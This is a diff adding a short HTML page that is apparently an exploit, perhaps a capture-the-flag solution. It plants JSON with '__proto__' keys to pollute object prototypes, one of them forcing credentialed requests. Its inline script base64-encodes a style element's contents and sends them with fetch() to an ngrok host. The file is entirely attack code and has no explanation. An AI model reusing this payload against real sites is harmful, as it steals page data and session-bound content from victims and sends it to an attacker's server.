@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+    </head>
+    <body>
+        <div id="page-settings">
+            {
+                "fontSize": 200,
+                "font": "http://app",
+                "__proto__": {
+                    "10": "http://app"
+                }
+            }
+        </div>
+        <div id="page-style">
+            {
+                "__proto__": {
+                    "credentials": "include"
+                }
+            }
+        </div>
+        <p>Hi</p>
+        <script>
+            setTimeout(() => {
+                const style = document.querySelector('style');
+                fetch("http://0759-42-60-216-15.ngrok.io/?" + btoa(style.innerText));
+            }, 2000);
+        </script>
+    </body>
+</html>
